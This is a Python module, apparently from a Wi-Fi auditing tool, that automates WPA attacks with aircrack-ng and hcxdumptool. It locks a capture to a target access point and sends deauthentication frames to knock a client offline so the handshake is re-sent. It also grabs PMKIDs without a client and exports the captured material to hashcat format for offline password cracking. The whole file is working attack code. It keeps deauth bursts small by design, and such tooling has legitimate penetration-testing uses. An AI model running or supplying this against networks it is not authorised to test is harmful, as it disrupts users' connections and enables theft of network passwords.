"""Targeted capture: lock the radio to one AP, deauth, grab the handshake.

Flow this module supports (all standard aircrack-ng suite usage):
  1. start a capture pinned to the target BSSID + channel (airodump-ng -> .cap)
  2. send a *small, targeted* burst of deauth frames (aireplay-ng) to nudge a
     client into reconnecting so the 4-way handshake is re-sent
  3. verify the .cap actually contains a handshake (aircrack-ng)
  4. optionally export to hashcat 22000 format (hcxpcapngtool)

Deauth defaults are deliberately low (a few frames at a specific client) — the
goal is to catch a reconnect, not to hold anyone offline.
"""

from __future__ import annotations

import glob
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass
from typing import List, Optional

from .util import CmdResult, LogFn, run, spawn, terminate, which


@dataclass
class CaptureTarget:
    bssid: str
    channel: str
    essid: str = ""


def is_valid_channel(channel: str) -> bool:
    """A capture must pin to a real channel; airodump rejects unknown/negative."""
    try:
        return int(str(channel)) > 0
    except (TypeError, ValueError):
        return False


def safe_prefix(out_dir: str, essid: str, bssid: str) -> str:
    """Filesystem-safe capture prefix from a (possibly messy) ESSID + BSSID."""
    safe_essid = re.sub(r"[^A-Za-z0-9_-]+", "_", essid or "target").strip("_") or "target"
    return os.path.join(out_dir, f"{safe_essid}_{bssid.replace(':', '')}")


def capture_argv(mon_iface: str, bssid: str, channel: str, prefix: str) -> list:
    """airodump-ng argv for a capture pinned to one AP's channel + BSSID."""
    return [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", prefix,
        mon_iface,
    ]


def deauth_argv(mon_iface: str, bssid: str, client: Optional[str], count: int) -> list:
    """aireplay-ng argv for a targeted (or broadcast) deauth burst."""
    argv = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        argv += ["-c", client]
    argv.append(mon_iface)
    return argv


def injection_test(mon_iface: str, log: Optional[LogFn] = None) -> bool:
    """Run `aireplay-ng --test` to confirm the adapter can actually inject.

    A card that scans fine but can't inject will never capture a handshake, so
    this is worth checking before blaming the target.
    """
    res = run(["aireplay-ng", "--test", mon_iface], timeout=25, log=log)
    ok = "injection is working" in res.text().lower()
    if log:
        log("Injection is working." if ok else "Injection test did NOT confirm working injection.")
    return ok


class CaptureSession:
    """Owns the pinned airodump-ng capture process and its output files."""

    def __init__(self, mon_iface: str, target: CaptureTarget, out_dir: Optional[str] = None,
                 log: Optional[LogFn] = None):
        self.mon_iface = mon_iface
        self.target = target
        self.log = log
        self._proc: Optional[subprocess.Popen] = None
        self._logfh = None
        self._logpath: Optional[str] = None
        self.out_dir = out_dir or tempfile.mkdtemp(prefix="wifiaudit-cap-")
        os.makedirs(self.out_dir, exist_ok=True)
        self.prefix = safe_prefix(self.out_dir, target.essid, target.bssid)

    # -- capture -----------------------------------------------------------
    def start(self) -> None:
        """Begin capturing, locked to the target's channel and BSSID."""
        self._logpath = self.prefix + ".airodump.log"
        self._logfh = open(self._logpath, "w")
        self._proc = spawn(
            capture_argv(self.mon_iface, self.target.bssid, self.target.channel, self.prefix),
            log=self.log, out=self._logfh,
        )
        if self.log:
            self.log(f"Capturing {self.target.essid or self.target.bssid} on channel {self.target.channel}")

    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def stop(self) -> None:
        terminate(self._proc, log=self.log)
        self._proc = None
        if self._logfh:
            try:
                self._logfh.close()
            except OSError:
                pass
            self._logfh = None

    def log_tail(self, n: int = 8) -> str:
        if not self._logpath or not os.path.exists(self._logpath):
            return ""
        try:
            with open(self._logpath, "r", errors="replace") as f:
                return "\n".join(f.read().splitlines()[-n:])
        except OSError:
            return ""

    def cap_file(self) -> Optional[str]:
        """Newest .cap file this session has produced."""
        files = sorted(glob.glob(self.prefix + "*.cap"))
        return files[-1] if files else None

    # -- deauth ------------------------------------------------------------
    def deauth(self, client: Optional[str] = None, count: int = 5) -> CmdResult:
        """Send a small burst of deauth frames.

        If `client` is given, the deauth is directed at that station (quietest,
        most effective for catching one reconnect). Otherwise it's broadcast to
        the AP. `count` frames are sent and aireplay exits (count=0 would loop
        forever — intentionally not the default).
        """
        who = client or "broadcast"
        if self.log:
            self.log(f"Deauth x{count} at {who} on {self.target.bssid}")
        return run(deauth_argv(self.mon_iface, self.target.bssid, client, count), timeout=30, log=self.log)

    # -- verify ------------------------------------------------------------
    def has_handshake(self) -> bool:
        cap = self.cap_file()
        if not cap:
            return False
        return verify_handshake(cap, self.target.bssid, log=self.log)

    # -- export ------------------------------------------------------------
    def export_22000(self) -> Optional[str]:
        cap = self.cap_file()
        if not cap:
            return None
        return export_hashcat(cap, log=self.log)


def _scan_handshake_text(text: str, bssid: str = "") -> bool:
    """Pure parser: does aircrack-ng's output claim a handshake?

    aircrack lists each network with a "(N handshake)" marker. We treat any
    N>=1 as success (preferring a row that also names the target BSSID).
    """
    for line in text.splitlines():
        low = line.lower()
        if "handshake" in low and "(0 handshake" not in low and "no valid" not in low:
            if not bssid or bssid.lower() in low:
                return True
    # Only when no specific target was named do we accept a marker that appears
    # without a BSSID on its line; a targeted check must match the target's row
    # so a handshake for some *other* network in the same .cap isn't a false hit.
    if not bssid:
        return bool(re.search(r"\(\s*[1-9]\d*\s*handshake", text, re.I))
    return False


def verify_handshake(cap_file: str, bssid: str = "", log: Optional[LogFn] = None) -> bool:
    """Return True if aircrack-ng reports a WPA handshake in the capture.

    `aircrack-ng file.cap` prints a table of networks; a captured handshake is
    flagged as "(1 handshake)" next to the ESSID.
    """
    if not cap_file or not os.path.exists(cap_file):
        return False
    # input_text="" closes stdin: if the .cap holds several BSSIDs, aircrack-ng
    # would otherwise prompt "Index number of target network?" and block until
    # our timeout. With stdin at EOF it prints the network table and exits.
    res = run(["aircrack-ng", cap_file], timeout=30, input_text="", log=log)
    found = _scan_handshake_text(res.text(), bssid)
    if log:
        log("Handshake present." if found else "No handshake captured yet.")
    return found


def export_hashcat(cap_file: str, out_file: Optional[str] = None, log: Optional[LogFn] = None) -> Optional[str]:
    """Convert a .cap to hashcat's 22000 format via hcxpcapngtool.

    Returns the output path on success, else None. This is the modern hand-off
    for offline cracking with hashcat; it's optional and only runs if the tool
    is installed.
    """
    if which("hcxpcapngtool") is None:
        if log:
            log("hcxpcapngtool not installed; skipping 22000 export (apt install hcxtools).")
        return None
    if not cap_file or not os.path.exists(cap_file):
        return None
    out_file = out_file or (os.path.splitext(cap_file)[0] + ".22000")
    res = run(["hcxpcapngtool", "-o", out_file, cap_file], timeout=60, log=log)
    if res.ok and os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        if log:
            log(f"Exported hashcat 22000: {out_file}")
        return out_file
    if log:
        log("Export produced no usable hashes (handshake may be incomplete).")
    return None


# ----------------------------------------------------------------- PMKID
def hcxdumptool_argv(iface: str, out_pcapng: str, channel: Optional[str] = None) -> list:
    """Build an hcxdumptool command for clientless (PMKID) capture.

    NOTE: hcxdumptool's CLI has changed across major versions. `-i` (interface)
    and `-w` (pcapng output) are stable; channel pinning (`-c`) exists on 6.3+.
    The exact command is always echoed to the log so it can be adjusted if your
    installed version differs.
    """
    argv = ["hcxdumptool", "-i", iface, "-w", out_pcapng]
    if channel:
        argv += ["-c", str(channel)]
    return argv


def pmkid_from_22000(text: str) -> bool:
    """hcxpcapngtool writes 22000 lines: WPA*01* = PMKID, WPA*02* = EAPOL."""
    return "WPA*01*" in text


def hash_kinds(text: str) -> set:
    """Which crackable material a 22000 blob contains: {'PMKID','EAPOL'}."""
    kinds = set()
    if "WPA*01*" in text:
        kinds.add("PMKID")
    if "WPA*02*" in text:
        kinds.add("EAPOL")
    return kinds


class PmkidSession:
    """Clientless PMKID capture via hcxdumptool (no deauth needed).

    Many WPA2 APs hand out a PMKID in the first EAPOL message, so a PMKID can
    often be grabbed without any connected client and without deauthing anyone.
    """

    def __init__(self, mon_iface: str, target: CaptureTarget, out_dir: Optional[str] = None,
                 log: Optional[LogFn] = None):
        self.mon_iface = mon_iface
        self.target = target
        self.log = log
        self._proc: Optional[subprocess.Popen] = None
        self._logfh = None
        self._logpath: Optional[str] = None
        self.out_dir = out_dir or tempfile.mkdtemp(prefix="wifiaudit-pmkid-")
        os.makedirs(self.out_dir, exist_ok=True)
        self.pcapng = safe_prefix(self.out_dir, target.essid, target.bssid) + ".pcapng"

    def start(self) -> None:
        self._logpath = self.pcapng + ".log"
        self._logfh = open(self._logpath, "w")
        chan = self.target.channel if is_valid_channel(self.target.channel) else None
        self._proc = spawn(hcxdumptool_argv(self.mon_iface, self.pcapng, chan),
                           log=self.log, out=self._logfh)
        if self.log:
            self.log(f"PMKID capture on {self.mon_iface} -> {os.path.basename(self.pcapng)}")

    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def stop(self) -> None:
        terminate(self._proc, log=self.log)
        self._proc = None
        if self._logfh:
            try:
                self._logfh.close()
            except OSError:
                pass
            self._logfh = None

    def log_tail(self, n: int = 8) -> str:
        if not self._logpath or not os.path.exists(self._logpath):
            return ""
        try:
            with open(self._logpath, "r", errors="replace") as f:
                return "\n".join(f.read().splitlines()[-n:])
        except OSError:
            return ""

    def cap_file(self) -> Optional[str]:
        return self.pcapng if os.path.exists(self.pcapng) else None

    def export_22000(self) -> Optional[str]:
        return export_hashcat(self.pcapng, log=self.log) if os.path.exists(self.pcapng) else None

    def check_pmkid(self) -> bool:
        """Convert the pcapng and report whether a PMKID was captured."""
        out = self.export_22000()
        if not out:
            return False
        try:
            with open(out, "r", errors="replace") as f:
                text = f.read()
        except OSError:
            return False
        found = pmkid_from_22000(text)
        if self.log:
            self.log("PMKID captured." if found else "No PMKID yet.")
        return found
